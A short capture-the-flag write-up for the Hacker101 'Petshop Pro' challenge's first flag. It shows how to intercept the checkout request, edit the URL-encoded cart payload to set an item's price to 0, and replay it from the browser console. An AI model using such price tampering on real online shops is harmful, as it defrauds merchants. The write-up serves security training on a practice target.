# Hacker101 CTF: Petshop pro

Let's try new format, without excess water.
The challenge provides a simple petshop page which includes two images and buttons for adding to the bucket.
<img width="783" height="453" alt="image" src="https://github.com/user-attachments/assets/5ccbeae9-a5b1-4c00-bd71-ad583948499a" />

### Flag №1:
Try to make order then click `F12` in a browser and deep to the header request and payloads. Our order sends in payloads like open data, that we can correct and send it again.
Let's do it and change the price for example.
```javascript
Before
"cart=%5B%5B1%2C+%7B%22name%22%3A+%22Puppy%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+puppy.%22%2C+%22logo%22%3A+%22puppy.jpg%22%2C+%22price%22%3A+7.95%7D%5D%5D"

After
"cart=%5B%5B1%2C+%7B%22name%22%3A+%22Puppy%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+puppy.%22%2C+%22logo%22%3A+%22puppy.jpg%22%2C+%22price%22%3A+0%7D%5D%5D",```
Click on the `checkout` request then `copy as fetch` and paste to the `console` in browser developers menu. Send! Go to the response and get ^FIRST FLAG^!
